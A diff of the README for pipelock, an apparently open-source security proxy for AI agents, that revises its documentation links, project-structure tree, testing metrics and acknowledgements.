+| [Metrics Reference](docs/metrics.md) | All 20 Prometheus metrics, alert rule templates |
+| [OWASP Mapping](docs/owasp-mapping.md) | Coverage against OWASP Agentic AI Top 10 |
+| [Comparison](docs/comparison.md) | How pipelock compares to agent-scan, srt, agentsh, MCP Gateway |
+| [Finding Suppression](docs/guides/suppression.md) | Rule names, path matching, inline comments, CI integration |
+| [Security Assurance](docs/security-assurance.md) | Security model, trust boundaries, supply chain |
+| [EU AI Act Mapping](docs/compliance/eu-ai-act-mapping.md) | Article-by-article compliance mapping |
+
+## Project Structure
+
 ```text
 cmd/pipelock/          CLI entry point
 internal/
-  cli/                 Cobra commands (run, check, generate, logs, git, integrity, mcp,
-                         keygen, sign, verify, trust, version, healthcheck)
-  config/              YAML config loading, validation, defaults, hot-reload (fsnotify)
-  scanner/             URL scanning (SSRF, blocklist, rate limit, DLP, entropy, env leak)
-  audit/               Structured JSON audit logging (zerolog) + event emission dispatch
-  proxy/               HTTP proxy: fetch (/fetch), forward (CONNECT + absolute-URI), WebSocket (/ws), DNS pinning
-  metrics/             Prometheus metrics + JSON stats endpoint
-  gitprotect/          Git-aware security (diff scanning, branch validation, hooks)
-  integrity/           File integrity monitoring (SHA256 manifests, check/diff, exclusions)
-  signing/             Ed25519 key management, file signing, signature verification
-  mcp/                 MCP proxy (stdio + Streamable HTTP) + bidirectional scanning + tool poisoning + chain detection
-  killswitch/          Emergency deny-all controller (config, signal, sentinel file, API) + port isolation
-  emit/                Event emission to external systems (webhook + syslog sinks)
-  hitl/                Human-in-the-loop terminal approval (ask action)
-  normalize/           Unicode normalization pipeline (NFC, whitespace, combining marks)
-configs/               Preset config files (strict, balanced, audit, claude-code, cursor, generic-agent)
-docs/                  OWASP mapping, tool comparison
-blog/                  Blog posts (mirrored at pipelab.org/blog/)
+  cli/                 20+ Cobra commands (run, check, generate, mcp, integrity, ...)
+  config/              YAML config, validation, defaults, hot-reload (fsnotify)
+  scanner/             9-layer URL scanning pipeline + response injection detection
+  audit/               Structured JSON logging (zerolog) + event emission dispatch
+  proxy/               HTTP proxy: fetch, forward (CONNECT), WebSocket, DNS pinning
+  mcp/                 MCP proxy + bidirectional scanning + tool poisoning + chains
+  killswitch/          Emergency deny-all (4 sources) + port-isolated API
+  emit/                Event emission (webhook + syslog sinks)
+  metrics/             Prometheus metrics + JSON stats
+  normalize/           Unicode normalization (NFKC, confusables, combining marks)
+  integrity/           SHA256 file integrity monitoring
+  signing/             Ed25519 key management
+  gitprotect/          Git diff scanning for secrets
+  hitl/                Human-in-the-loop terminal approval
+configs/               6 preset config files
+docs/                  Guides, references, compliance mappings
 ```
 
 ## Testing
 
-Canonical metrics — updated each release.
+Canonical metrics, updated each release.
 
 | Metric | Value |
 |--------|-------|
 | Go tests (with `-race`) | 3,558 |
 | Statement coverage | 96%+ |
 | Evasion techniques tested | 230+ |
-| Scanner pipeline overhead | ~25μs per URL scan |
+| Scanner pipeline overhead | ~25us per URL scan |
 | CI matrix | Go 1.24 + 1.25, CodeQL, golangci-lint |
 | Supply chain | SLSA provenance, CycloneDX SBOM, cosign signatures |
 | OpenSSF Scorecard | 8.0/10 |
@@ -823,7 +491,7 @@ Run `make test` to verify locally. Full benchmark details: [docs/benchmarks.md](
 
 - Architecture influenced by [Anthropic's Claude Code sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing) and [sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime)
 - Threat model informed by [OWASP Agentic AI Top 10](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
-- See [docs/comparison.md](docs/comparison.md) for how Pipelock relates to [Snyk agent-scan](https://github.com/snyk/agent-scan), [Docker MCP Gateway](https://github.com/docker/mcp-gateway), [AIP](https://github.com/ArangoGutierrez/agent-identity-protocol), [agentsh](https://github.com/canyonroad/agentsh), and [srt](https://github.com/anthropic-experimental/sandbox-runtime)
+- See [docs/comparison.md](docs/comparison.md) for how Pipelock relates to other tools in this space
 - Security review contributions from Dylan Corrales
 
 Contributions welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
